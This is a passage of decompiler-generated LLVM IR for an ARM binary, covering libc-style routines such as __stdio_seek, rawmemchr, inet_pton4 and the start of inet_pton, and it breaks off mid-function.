  br i1 %v2_2dc2c, label %dec_label_pc_2dc34, label %dec_label_pc_2dc48

dec_label_pc_2dc34:                               ; preds = %dec_label_pc_2dc2c
  %v2_2dc34 = or i32 %v0_2dc1c, %v3_2dc18
  store i32 %v2_2dc34, i32* %r3.global-to-local, align 4
  %v1_2dc38 = trunc i32 %v2_2dc34 to i16
  store i16 %v1_2dc38, i16* %v1_2dc18, align 2
  %v0_2dc3c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_2dc3c

dec_label_pc_2dc3c:                               ; preds = %entry, %dec_label_pc_2dc34
  %v0_2dc3c = phi i32 [ %v0_2dc18, %entry ], [ %v0_2dc3c.pre, %dec_label_pc_2dc34 ]
  %v1_2dc3c = inttoptr i32 %v0_2dc3c to i16*
  %v2_2dc3c = load i16, i16* %v1_2dc3c, align 2
  %v3_2dc3c = zext i16 %v2_2dc3c to i32
  store i32 %v3_2dc3c, i32* %r3.global-to-local, align 4
  %v1_2dc40 = and i32 %v3_2dc3c, 16
  store i32 %v1_2dc40, i32* %r5.global-to-local, align 4
  %v2_2dc40 = icmp eq i32 %v1_2dc40, 0
  br i1 %v2_2dc40, label %dec_label_pc_2dc70, label %dec_label_pc_2dc48

dec_label_pc_2dc48:                               ; preds = %dec_label_pc_2dc2c, %dec_label_pc_2dc3c
  store i32 85212, i32* %r3.global-to-local, align 4
  %v0_2dc4c = call i32 @__aeabi_read_tp()
  store i32 %v0_2dc4c, i32* %r0.global-to-local, align 4
  %v3_2dc50 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2dc50 = sext i16 %v3_2dc50 to i32
  store i32 %v4_2dc50, i32* %r3.global-to-local, align 4
  %v3_2dc58 = add i32 %v4_2dc50, %v0_2dc4c
  %v4_2dc58 = inttoptr i32 %v3_2dc58 to i32*
  store i32 9, i32* %v4_2dc58, align 4
  br label %dec_label_pc_2dc5c

dec_label_pc_2dc5c:                               ; preds = %dec_label_pc_2dc78, %dec_label_pc_2dc48
  %v0_2dc5c = load i32, i32* @r4, align 4
  %v1_2dc5c = inttoptr i32 %v0_2dc5c to i16*
  %v2_2dc5c = load i16, i16* %v1_2dc5c, align 2
  %v3_2dc5c = zext i16 %v2_2dc5c to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_2dc64 = or i32 %v3_2dc5c, 8
  store i32 %v1_2dc64, i32* %r3.global-to-local, align 4
  %v1_2dc68 = trunc i32 %v1_2dc64 to i16
  store i16 %v1_2dc68, i16* %v1_2dc5c, align 2
  %v1_2dcb0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2dca8

dec_label_pc_2dc70:                               ; preds = %dec_label_pc_2dc3c
  %v1_2dc70 = and i32 %v3_2dc3c, 64
  %v2_2dc70 = icmp eq i32 %v1_2dc70, 0
  br i1 %v2_2dc70, label %dec_label_pc_2dc98, label %dec_label_pc_2dc78

dec_label_pc_2dc78:                               ; preds = %dec_label_pc_2dc70
  %v0_2dc78 = call i32 @__stdio_wcommit()
  store i32 %v0_2dc78, i32* %r0.global-to-local, align 4
  %v2_2dc7c = icmp eq i32 %v0_2dc78, 0
  br i1 %v2_2dc7c, label %dec_label_pc_2dc84, label %dec_label_pc_2dc5c

dec_label_pc_2dc84:                               ; preds = %dec_label_pc_2dc78
  %v0_2dc84 = load i32, i32* @r4, align 4
  %v1_2dc84 = inttoptr i32 %v0_2dc84 to i16*
  %v2_2dc84 = load i16, i16* %v1_2dc84, align 2
  %v3_2dc84 = zext i16 %v2_2dc84 to i32
  store i32 %v3_2dc84, i32* %r3.global-to-local, align 4
  %v1_2dc88 = add i32 %v0_2dc84, 8
  %v2_2dc88 = inttoptr i32 %v1_2dc88 to i32*
  %v3_2dc88 = load i32, i32* %v2_2dc88, align 4
  %v1_2dc8c = and i32 %v3_2dc84, 65471
  store i32 %v1_2dc8c, i32* %r3.global-to-local, align 4
  %v2_2dc90 = add i32 %v0_2dc84, 28
  %v3_2dc90 = inttoptr i32 %v2_2dc90 to i32*
  store i32 %v3_2dc88, i32* %v3_2dc90, align 4
  %v0_2dc94 = load i32, i32* %r3.global-to-local, align 4
  %v1_2dc94 = trunc i32 %v0_2dc94 to i16
  %v2_2dc94 = load i32, i32* @r4, align 4
  %v3_2dc94 = inttoptr i32 %v2_2dc94 to i16*
  store i16 %v1_2dc94, i16* %v3_2dc94, align 2
  %v0_2dc98.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_2dc98

dec_label_pc_2dc98:                               ; preds = %dec_label_pc_2dc70, %dec_label_pc_2dc84
  %v2_2dca0 = phi i32 [ %v0_2dc3c, %dec_label_pc_2dc70 ], [ %v0_2dc98.pre, %dec_label_pc_2dc84 ]
  %v1_2dc98 = inttoptr i32 %v2_2dca0 to i16*
  %v2_2dc98 = load i16, i16* %v1_2dc98, align 2
  %v3_2dc98 = zext i16 %v2_2dc98 to i32
  %v1_2dc9c = or i32 %v3_2dc98, 1
  store i32 %v1_2dc9c, i32* %r3.global-to-local, align 4
  %v1_2dca0 = trunc i32 %v1_2dc9c to i16
  store i16 %v1_2dca0, i16* %v1_2dc98, align 2
  %v0_2dca4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_2dca4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2dca8

dec_label_pc_2dca8:                               ; preds = %dec_label_pc_2dc5c, %dec_label_pc_2dc98
  %v1_2dcb0 = phi i32 [ %v1_2dcb0.pre, %dec_label_pc_2dc5c ], [ %v0_2dca4, %dec_label_pc_2dc98 ]
  %v2_2dcac = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_2dcac, i32* @r4, align 4
  ret i32 %v1_2dcb0

; uselistorder directives
  uselistorder i32 %v3_2dc18, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 5, 2, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_2dca8, { 1, 0 }
  uselistorder label %dec_label_pc_2dc98, { 1, 0 }
  uselistorder label %dec_label_pc_2dc48, { 1, 0 }
  uselistorder label %dec_label_pc_2dc3c, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_2dcc4 = load i32, i32* %arg2, align 4
  %v3_2dcc4 = add i32 %tmp, 4
  %v4_2dcc4 = inttoptr i32 %v3_2dcc4 to i32*
  %v5_2dcc4 = load i32, i32* %v4_2dcc4, align 4
  %v1_2dcc8 = add i32 %arg1, 4
  %v2_2dcc8 = inttoptr i32 %v1_2dcc8 to i32*
  %v3_2dcc8 = load i32, i32* %v2_2dcc8, align 4
  store i32 %tmp, i32* @r4, align 4
  %v4_2dcd0 = call i32 @__GI_lseek64(i32 %v3_2dcc8, i32 %tmp, i32 %v2_2dcc4, i32 %v5_2dcc4)
  %v1_2dcd4 = icmp slt i32* %arg2, null
  br i1 %v1_2dcd4, label %bb13, label %bb

bb:                                               ; preds = %entry
  %v3_2dcdc5 = load i32, i32* @r4, align 4
  %v4_2dcdc6 = inttoptr i32 %v3_2dcdc5 to i32*
  store i32 %v4_2dcd0, i32* %v4_2dcdc6, align 4
  %v6_2dcdc7 = add i32 %v3_2dcdc5, 4
  %v7_2dcdc8 = inttoptr i32 %v6_2dcdc7 to i32*
  store i32 %tmp, i32* %v7_2dcdc8, align 4
  br label %bb13

bb13:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v4_2dcd0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder label %bb13, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_2dcf8 = urem i32 %arg1, 256
  %v0_2dd102 = load i32, i32* @r0, align 4
  %v1_2dd103 = urem i32 %v0_2dd102, 4
  %v2_2dd104 = icmp eq i32 %v1_2dd103, 0
  br i1 %v2_2dd104, label %dec_label_pc_2dd18, label %dec_label_pc_2dd00

dec_label_pc_2dd00:                               ; preds = %entry, %dec_label_pc_2dd0c
  %v0_2dd0c = phi i32 [ %v1_2dd0c, %dec_label_pc_2dd0c ], [ %v0_2dd102, %entry ]
  %v1_2dd00 = inttoptr i32 %v0_2dd0c to i8*
  %v2_2dd00 = load i8, i8* %v1_2dd00, align 1
  %v3_2dd00 = zext i8 %v2_2dd00 to i32
  %v9_2dd04 = icmp eq i32 %v3_2dd00, %v1_2dcf8
  br i1 %v9_2dd04, label %dec_label_pc_2dd94, label %dec_label_pc_2dd0c

dec_label_pc_2dd0c:                               ; preds = %dec_label_pc_2dd00
  %v1_2dd0c = add i32 %v0_2dd0c, 1
  %v1_2dd10 = urem i32 %v1_2dd0c, 4
  %v2_2dd10 = icmp eq i32 %v1_2dd10, 0
  br i1 %v2_2dd10, label %dec_label_pc_2dd18, label %dec_label_pc_2dd00

dec_label_pc_2dd18:                               ; preds = %dec_label_pc_2dd0c, %entry
  %v0_2dd1c = phi i32 [ %v0_2dd102, %entry ], [ %v1_2dd0c, %dec_label_pc_2dd0c ]
  %v4_2dd18 = mul nuw nsw i32 %v1_2dcf8, 256
  %v5_2dd18 = or i32 %v4_2dd18, %v1_2dcf8
  %v4_2dd20 = mul i32 %v5_2dd18, 65536
  %v5_2dd20 = or i32 %v4_2dd20, %v5_2dd18
  br label %dec_label_pc_2dd24

dec_label_pc_2dd24:                               ; preds = %dec_label_pc_2dd84, %dec_label_pc_2dd24, %dec_label_pc_2dd18
  %v0_2dd68 = phi i32 [ %v0_2dd1c, %dec_label_pc_2dd18 ], [ %v4_2dd24, %dec_label_pc_2dd24 ], [ %v4_2dd24, %dec_label_pc_2dd84 ]
  %v1_2dd24 = inttoptr i32 %v0_2dd68 to i32*
  %v2_2dd24 = load i32, i32* %v1_2dd24, align 4
  %v4_2dd24 = add i32 %v0_2dd68, 4
  %v2_2dd2c = xor i32 %v2_2dd24, %v5_2dd20
  %v2_2dd30 = add i32 %v2_2dd2c, 2130640639
  %v1_2dd38 = sub i32 -1, %v2_2dd2c
  %v2_2dd3c = xor i32 %v2_2dd30, %v1_2dd38
  %v2_2dd40 = and i32 %v2_2dd3c, -2130640640
  %v2_2dd44 = icmp eq i32 %v2_2dd40, 0
  br i1 %v2_2dd44, label %dec_label_pc_2dd24, label %dec_label_pc_2dd4c

dec_label_pc_2dd4c:                               ; preds = %dec_label_pc_2dd24
  %v2_2dd4c = inttoptr i32 %v0_2dd68 to i8*
  %v3_2dd4c = load i8, i8* %v2_2dd4c, align 1
  %v4_2dd4c = zext i8 %v3_2dd4c to i32
  %v9_2dd54 = icmp eq i32 %v4_2dd4c, %v1_2dcf8
  %v1_2dd58 = add i32 %v0_2dd68, 3
  br i1 %v9_2dd54, label %dec_label_pc_2dd94, label %dec_label_pc_2dd60

dec_label_pc_2dd60:                               ; preds = %dec_label_pc_2dd4c
  %v1_2dd60 = add i32 %v0_2dd68, 1
  %v2_2dd60 = inttoptr i32 %v1_2dd60 to i8*
  %v3_2dd60 = load i8, i8* %v2_2dd60, align 1
  %v4_2dd60 = zext i8 %v3_2dd60 to i32
  %v9_2dd64 = icmp eq i32 %v4_2dd60, %v1_2dcf8
  br i1 %v9_2dd64, label %bb, label %dec_label_pc_2dd74

bb:                                               ; preds = %dec_label_pc_2dd60
  br label %dec_label_pc_2dd94

dec_label_pc_2dd74:                               ; preds = %dec_label_pc_2dd60
  %v1_2dd74 = add i32 %v0_2dd68, 2
  %v2_2dd74 = inttoptr i32 %v1_2dd74 to i8*
  %v3_2dd74 = load i8, i8* %v2_2dd74, align 1
  %v4_2dd74 = zext i8 %v3_2dd74 to i32
  %v9_2dd78 = icmp eq i32 %v4_2dd74, %v1_2dcf8
  br i1 %v9_2dd78, label %dec_label_pc_2dd94, label %dec_label_pc_2dd84

dec_label_pc_2dd84:                               ; preds = %dec_label_pc_2dd74
  %v2_2dd84 = inttoptr i32 %v1_2dd58 to i8*
  %v3_2dd84 = load i8, i8* %v2_2dd84, align 1
  %v4_2dd84 = zext i8 %v3_2dd84 to i32
  %v9_2dd88 = icmp eq i32 %v4_2dd84, %v1_2dcf8
  br i1 %v9_2dd88, label %dec_label_pc_2dd90, label %dec_label_pc_2dd24

dec_label_pc_2dd90:                               ; preds = %dec_label_pc_2dd84
  br label %dec_label_pc_2dd94

dec_label_pc_2dd94:                               ; preds = %dec_label_pc_2dd00, %dec_label_pc_2dd74, %dec_label_pc_2dd4c, %bb, %dec_label_pc_2dd90
  %v1_2dd98 = phi i32 [ %v1_2dd58, %dec_label_pc_2dd90 ], [ %v1_2dd60, %bb ], [ %v1_2dd74, %dec_label_pc_2dd74 ], [ %v0_2dd68, %dec_label_pc_2dd4c ], [ %v0_2dd0c, %dec_label_pc_2dd00 ]
  ret i32 %v1_2dd98

; uselistorder directives
  uselistorder i32 %v4_2dd24, { 1, 0 }
  uselistorder i32 %v0_2dd68, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_2dd18, { 1, 0 }
  uselistorder i32 %v1_2dd0c, { 1, 0, 2 }
  uselistorder i32 %v0_2dd102, { 2, 1, 0 }
  uselistorder i32 %v1_2dcf8, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 -2130640640, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 2130640639, { 6, 2, 7, 8, 3, 0, 9, 4, 1, 5, 10 }
  uselistorder label %dec_label_pc_2dd94, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_2dd00, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_2dda4 = load i32, i32* @r4, align 4
  %v6_2dda4 = load i32, i32* @r5, align 4
  %v15_2dda4 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 0, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v2_2ddbc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_2ddbc, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 10, i32* %r7.global-to-local, align 4
  store i32 1, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-28, align 4
  %v0_2de341 = load i32, i32* @r0, align 4
  %v1_2de342 = inttoptr i32 %v0_2de341 to i8*
  %v2_2de343 = load i8, i8* %v1_2de342, align 1
  %v3_2de344 = zext i8 %v2_2de343 to i32
  store i32 %v3_2de344, i32* @r3, align 4
  %v2_2de385 = icmp eq i8 %v2_2de343, 0
  store i1 %v2_2de385, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2de385, label %dec_label_pc_2de44, label %dec_label_pc_2ddd4

dec_label_pc_2ddd4:                               ; preds = %entry, %dec_label_pc_2de34.backedge
  %v0_2ddd8 = phi i32 [ %v0_2de34, %dec_label_pc_2de34.backedge ], [ %v0_2de341, %entry ]
  %v0_2de10 = phi i32 [ %v3_2de34, %dec_label_pc_2de34.backedge ], [ %v3_2de344, %entry ]
  %v2_2dde4.in = phi i32 [ %v3_2de34, %dec_label_pc_2de34.backedge ], [ %v3_2de344, %entry ]
  %v2_2dde4 = add nsw i32 %v2_2dde4.in, -48
  %v2_2ddd4 = icmp ugt i32 %v2_2dde4, 8
  %v7_2ddd4 = icmp eq i32 %v2_2dde4, 9
  store i1 %v7_2ddd4, i1* %cpsr_z.global-to-local, align 1
  %v1_2ddd8 = add i32 %v0_2ddd8, 1
  store i32 %v1_2ddd8, i32* %r0.global-to-local, align 4
  %v2_2dddc = xor i1 %v7_2ddd4, true
  %v3_2dddc = and i1 %v2_2ddd4, %v2_2dddc
  br i1 %v3_2dddc, label %dec_label_pc_2de10, label %dec_label_pc_2dde0

dec_label_pc_2dde0:                               ; preds = %dec_label_pc_2ddd4
  %v0_2dde0 = load i32, i32* %r1.global-to-local, align 4
  %v1_2dde0 = inttoptr i32 %v0_2dde0 to i8*
  %v2_2dde0 = load i8, i8* %v1_2dde0, align 1
  %v3_2dde0 = zext i8 %v2_2dde0 to i32
  %v0_2dde4 = load i32, i32* %r7.global-to-local, align 4
  %v3_2dde4 = mul i32 %v0_2dde4, %v3_2dde0
  %v4_2dde4 = add i32 %v3_2dde4, %v2_2dde4
  store i32 %v4_2dde4, i32* @r3, align 4
  %v2_2dde8 = icmp ugt i32 %v4_2dde4, 254
  %v7_2dde8 = icmp eq i32 %v4_2dde4, 255
  store i1 %v7_2dde8, i1* %cpsr_z.global-to-local, align 1
  %v2_2ddec = xor i1 %v7_2dde8, true
  %v3_2ddec = and i1 %v2_2dde8, %v2_2ddec
  br i1 %v3_2ddec, label %dec_label_pc_2de68, label %dec_label_pc_2ddf0

dec_label_pc_2ddf0:                               ; preds = %dec_label_pc_2dde0
  %v0_2ddf0 = load i32, i32* @lr, align 4
  %v2_2ddf0 = icmp eq i32 %v0_2ddf0, 0
  store i1 %v2_2ddf0, i1* %cpsr_z.global-to-local, align 1
  %v1_2ddf4 = trunc i32 %v4_2dde4 to i8
  store i8 %v1_2ddf4, i8* %v1_2dde0, align 1
  %v0_2ddf8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_2ddf8, label %dec_label_pc_2ddfc, label %dec_label_pc_2de34.backedge

dec_label_pc_2ddfc:                               ; preds = %dec_label_pc_2ddf0
  %v0_2ddfc = load i32, i32* @ip, align 4
  %v1_2ddfc = add i32 %v0_2ddfc, 1
  store i32 %v1_2ddfc, i32* @ip, align 4
  %v7_2de00 = icmp eq i32 %v1_2ddfc, 4
  store i1 %v7_2de00, i1* %cpsr_z.global-to-local, align 1
  %v0_2de04 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_2de04, i32* @lr, align 4
  %v8_2de08 = icmp sgt i32 %v1_2ddfc, 4
  br i1 %v8_2de08, label %dec_label_pc_2de68, label %dec_label_pc_2de34.backedge

dec_label_pc_2de10:                               ; preds = %dec_label_pc_2ddd4
  %v7_2de10 = icmp eq i32 %v0_2de10, 46
  %v1_2de18 = load i32, i32* @lr, align 4
  %v2_2de18 = urem i32 %v1_2de18, 2
  %storemerge12 = select i1 %v7_2de10, i32 %v2_2de18, i32 0
  store i32 %storemerge12, i32* @r3, align 4
  %v2_2de1c = icmp eq i32 %storemerge12, 0
  store i1 %v2_2de1c, i1* %cpsr_z.global-to-local, align 1
  %v0_2de20 = load i32, i32* @r5, align 4
  store i32 %v0_2de20, i32* @lr, align 4
  br i1 %v2_2de1c, label %dec_label_pc_2de68, label %dec_label_pc_2de28

dec_label_pc_2de28:                               ; preds = %dec_label_pc_2de10
  %v0_2de28 = load i32, i32* @ip, align 4
  %v7_2de28 = icmp eq i32 %v0_2de28, 4
  store i1 %v7_2de28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2de28, label %dec_label_pc_2de68, label %dec_label_pc_2de30

dec_label_pc_2de30:                               ; preds = %dec_label_pc_2de28
  %v1_2de30 = trunc i32 %v0_2de20 to i8
  %v2_2de30 = load i32, i32* %r1.global-to-local, align 4
  %v3_2de30 = add i32 %v2_2de30, 1
  %v4_2de30 = inttoptr i32 %v3_2de30 to i8*
  store i8 %v1_2de30, i8* %v4_2de30, align 1
  %v5_2de30 = load i32, i32* %r1.global-to-local, align 4
  %v6_2de30 = add i32 %v5_2de30, 1
  store i32 %v6_2de30, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2de34.backedge

dec_label_pc_2de34.backedge:                      ; preds = %dec_label_pc_2de30, %dec_label_pc_2ddf0, %dec_label_pc_2ddfc
  %v0_2de34 = load i32, i32* %r0.global-to-local, align 4
  %v1_2de34 = inttoptr i32 %v0_2de34 to i8*
  %v2_2de34 = load i8, i8* %v1_2de34, align 1
  %v3_2de34 = zext i8 %v2_2de34 to i32
  store i32 %v3_2de34, i32* @r3, align 4
  %v2_2de38 = icmp eq i8 %v2_2de34, 0
  store i1 %v2_2de38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2de38, label %dec_label_pc_2de34.dec_label_pc_2de44_crit_edge, label %dec_label_pc_2ddd4

dec_label_pc_2de34.dec_label_pc_2de44_crit_edge:  ; preds = %dec_label_pc_2de34.backedge
  %v0_2de44.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_2de44

dec_label_pc_2de44:                               ; preds = %dec_label_pc_2de34.dec_label_pc_2de44_crit_edge, %entry
  %v0_2de44 = phi i32 [ %v0_2de44.pre, %dec_label_pc_2de34.dec_label_pc_2de44_crit_edge ], [ 0, %entry ]
  %v7_2de44 = icmp eq i32 %v0_2de44, 3
  store i1 %v7_2de44, i1* %cpsr_z.global-to-local, align 1
  %v7_2de48 = icmp slt i32 %v0_2de44, 4
  br i1 %v7_2de48, label %dec_label_pc_2de68, label %dec_label_pc_2de4c

dec_label_pc_2de4c:                               ; preds = %dec_label_pc_2de44
  %v0_2de4c = load i32, i32* @r4, align 4
  store i32 %v0_2de4c, i32* @r0, align 4
  store i32 %v2_2ddbc, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_2de58 = call i32 @memcpy()
  br label %dec_label_pc_2de68

dec_label_pc_2de68:                               ; preds = %dec_label_pc_2dde0, %dec_label_pc_2ddfc, %dec_label_pc_2de10, %dec_label_pc_2de28, %dec_label_pc_2de44, %dec_label_pc_2de4c
  %storemerge = phi i32 [ 1, %dec_label_pc_2de4c ], [ 0, %dec_label_pc_2de44 ], [ 0, %dec_label_pc_2de28 ], [ 0, %dec_label_pc_2de10 ], [ 0, %dec_label_pc_2ddfc ], [ 0, %dec_label_pc_2dde0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v3_2dda4, i32* @r4, align 4
  store i32 %v6_2dda4, i32* @r5, align 4
  store i32 %v15_2dda4, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_2de44, { 1, 0 }
  uselistorder i32 %v3_2de34, { 2, 1, 0 }
  uselistorder i32 %v0_2de34, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 %v2_2dde4, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_2de68, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_2de34.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_2ddd4, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_2de74 = load i32, i32* @r4, align 4
  %v6_2de74 = load i32, i32* @r5, align 4
  %v9_2de74 = load i32, i32* @r6, align 4
  %v12_2de74 = load i32, i32* @r7, align 4
  %v27_2de74 = load i32, i32* @lr, align 4
  %v7_2de80 = icmp eq i32 %arg1, 2
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v7_2de80, label %dec_label_pc_2dea0, label %dec_label_pc_2de94

dec_label_pc_2de94:                               ; preds = %entry
  %v7_2de94 = icmp eq i32 %arg1, 10
  br i1 %v7_2de94, label %dec_label_pc_2deb0, label %dec_label_pc_2e068

dec_label_pc_2dea0:                               ; preds = %entry
  store i32 %tmp, i32* @r0, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_2dea8 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  br label %dec_label_pc_2e080

dec_label_pc_2deb0:                               ; preds = %dec_label_pc_2de94
  %v2_2deb0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_2debc = bitcast i32* %stack_var_-56 to i8*
  %v4_2debc = call i32 @__GI_memset(i8* %v3_2debc, i32 0, i32 16)
  %v0_2dec0 = load i32, i32* @r5, align 4
  %v1_2dec0 = inttoptr i32 %v0_2dec0 to i8*
  %v2_2dec0 = load i8, i8* %v1_2dec0, align 1
  %v3_2dec0 = zext i8 %v2_2dec0 to i32
  store i32 %v3_2dec0, i32* %r3.global-to-local, align 4
  %v7_2dec4 = icmp eq i8 %v2_2dec0, 58
  store i32 %v4_2debc, i32* @r6, align 4
  %v2_2decc = add i32 %v4_2debc, 16
  store i32 %v2_2decc, i32* %r8.global-to-local, align 4
  br i1 %v7_2dec4, label %dec_label_pc_2ded4, label %dec_label_pc_2dee0

dec_label_pc_2ded4:                               ; preds = %dec_label_pc_2deb0
  %v1_2ded4 = add i32 %v0_2dec0, 1
  %v2_2ded4 = inttoptr i32 %v1_2ded4 to i8*
  %v3_2ded4 = load i8, i8* %v2_2ded4, align 1
  %v4_2ded4 = zext i8 %v3_2ded4 to i32
  store i32 %v4_2ded4, i32* %r3.global-to-local, align 4
  store i32 %v1_2ded4, i32* @r5, align 4
  %v7_2ded8 = icmp eq i8 %v3_2ded4, 58
  br i1 %v7_2ded8, label %dec_label_pc_2dee0, label %dec_label_pc_2e060

dec_label_pc_2dee0:                               ; preds = %dec_label_pc_2ded4, %dec_label_pc_2deb0
  %v0_2deec = phi i32 [ %v1_2ded4, %dec_label_pc_2ded4 ], [ %v0_2dec0, %dec_label_pc_2deb0 ]
  store i32 -33244, i32* @r3, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v0_2dee8 = load i32, i32* @r4, align 4
  %v2_2dee8 = add i32 %v0_2dee8, -33244
  store i32 %v0_2deec, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i32 %v2_2dee8, i32* %stack_var_-64, align 4
  %v1_2dfc43 = inttoptr i32 %v0_2deec to i8*
  %v2_2dfc44 = load i8, i8* %v1_2dfc43, align 1
  %v3_2dfc45 = zext i8 %v2_2dfc44 to i32
  store i32 %v3_2dfc45, i32* @r4, align 4
  %v2_2dfc86 = icmp eq i8 %v2_2dfc44, 0
  br i1 %v2_2dfc86, label %dec_label_pc_2dfd0.thread, label %dec_label_pc_2df00

dec_label_pc_2dfd0.thread:                        ; preds = %dec_label_pc_2dee0
  store i32 %v4_2debc, i32* @r4, align 4
  br label %dec_label_pc_2dffc

dec_label_pc_2df00:                               ; preds = %dec_label_pc_2dee0, %dec_label_pc_2dfc4.backedge.dec_label_pc_2df00_crit_edge
  %v0_2df04 = phi i32 [ %v3_2dfc4, %dec_label_pc_2dfc4.backedge.dec_label_pc_2df00_crit_edge ], [ %v3_2dfc45, %dec_label_pc_2dee0 ]
  %v2_2df00 = phi i32 [ %v2_2df00.pre, %dec_label_pc_2dfc4.backedge.dec_label_pc_2df00_crit_edge ], [ %v2_2dee8, %dec_label_pc_2dee0 ]
  store i32 %v2_2df00, i32* @r0, align 4
  %v1_2df04 = or i32 %v0_2df04, 32
  store i32 %v1_2df04, i32* %r1.global-to-local, align 4
  %v2_2df08 = call i32 @__GI_strchr(i32 %v2_2df00, i32 %v1_2df04)
  %v2_2df0c = icmp eq i32 %v2_2df08, 0
  %v0_2df10 = load i32, i32* @r5, align 4
  %v1_2df10 = add i32 %v0_2df10, 1
  store i32 %v1_2df10, i32* @r5, align 4
  br i1 %v2_2df0c, label %dec_label_pc_2df34, label %dec_label_pc_2df18

dec_label_pc_2df18:                               ; preds = %dec_label_pc_2df00
  %v2_2df18 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_2df18, i32* %r2.global-to-local, align 4
  %v2_2df1c = sub i32 %v2_2df08, %v2_2df18
  %v1_2df20 = load i32, i32* @r7, align 4
  %v4_2df20 = mul i32 %v1_2df20, 16
  %v5_2df20 = or i32 %v4_2df20, %v2_2df1c
  store i32 %v5_2df20, i32* @r7, align 4
  store i32 65535, i32* @r3, align 4
  %tmp36 = icmp ult i32 %v5_2df20, 65536
  br i1 %tmp36, label %dec_label_pc_2dfc0, label %dec_label_pc_2e060

dec_label_pc_2df34:                               ; preds = %dec_label_pc_2df00
  %v0_2df34 = load i32, i32* @r4, align 4
  %v7_2df34 = icmp eq i32 %v0_2df34, 58
  br i1 %v7_2df34, label %dec_label_pc_2df3c, label %dec_label_pc_2df94

dec_label_pc_2df3c:                               ; preds = %dec_label_pc_2df34
  %v0_2df3c = load i32, i32* %sb.global-to-local, align 4
  %v2_2df3c = icmp eq i32 %v0_2df3c, 0
  br i1 %v2_2df3c, label %dec_label_pc_2df44, label %dec_label_pc_2df58

dec_label_pc_2df44:                               ; preds = %dec_label_pc_2df3c
  %v0_2df44 = load i32, i32* %fp.global-to-local, align 4
  %v2_2df44 = icmp eq i32 %v0_2df44, 0
  br i1 %v2_2df44, label %dec_label_pc_2df4c, label %dec_label_pc_2e060

